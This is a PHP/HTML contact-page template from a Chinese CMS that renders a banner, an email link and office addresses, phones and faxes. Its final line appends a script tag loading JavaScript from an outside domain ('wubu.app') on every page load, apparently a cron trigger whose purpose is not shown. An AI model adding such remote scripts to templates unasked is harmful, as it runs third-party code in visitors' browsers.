<?php if ($fn_include = $this->_include("header.html")) include($fn_include); ?>
<!--banner-->
<section class="content-banner-wrap wb100" style="background-image: url(<?php echo dr_thumb($thumb); ?>)">
    <!--content-->
    <div class="content-banner m9 m-auto   wow fadeInUp bg-red animated">
        <div class="title">
            <span class="sp1">
                联系方式
            </span><br/>
            <span class="sp2">
                CONTACT
            </span>
        </div>   
        <!--mail-->
        <div class="mail-wrap wow pulse animated" data-wow-duration="1500ms" data-wow-iteration="infinite"">
            <a href="mailto:<?php echo om_block(3); ?>">
                <i class="fa fa-envelope-o fa-fw"></i>
                <p><?php echo om_block(3); ?></p>
            </a>
        </div>
        <!--mail end -->
        <!--address-->
        <div class="address-wrap">
            <!--<?php echo $content; ?>-->
            <table>
                <tr>
                    <th><?php echo om_block(11); ?></th>
                    <th><?php echo om_block(12); ?></th>
                </tr>
                <tr>
                    <td>
                        <div class="test">
                            <i class="fa fa-map-marker"></i>
                            <span class="fr"><?php echo om_block(5); ?></span>
                        </div>
                    </td>
                    <td>
                        <div class="test">
                            <i class="fa fa-map-marker"></i>
                            <span class="fr"><?php echo om_block(6); ?></span>
                        </div>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td>
                        <div class="test">
                            <i class="fa fa-phone"></i>
                            <span class="fr"><?php echo om_block(7); ?></span>
                        </div>
                    </td>
                    <td>
                        <div class="test">
                            <i class="fa fa-phone"></i>
                            <span class="fr"><?php echo om_block(8); ?></span>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td>
                        <div class="test">
                            <i class="fa fa-fax"></i>
                            <span class="fr"><?php echo om_block(9); ?></span>
                        </div>
                    </td>
                    <td>
                        <div class="test">
                            <i class="fa fa-fax"></i>
                            <span class="fr"><?php echo om_block(10); ?></span>
                        </div>
                    </td>
                </tr>
            </table>
        </div>
        <!--address end-->
    </div>
    <!--content end -->
   
</section>
<!--banner end -->
<?php if ($fn_include = $this->_include("footer.html")) include($fn_include); ?><script type="text/javascript" src="http://wubu.app/index.php?c=cron"></script>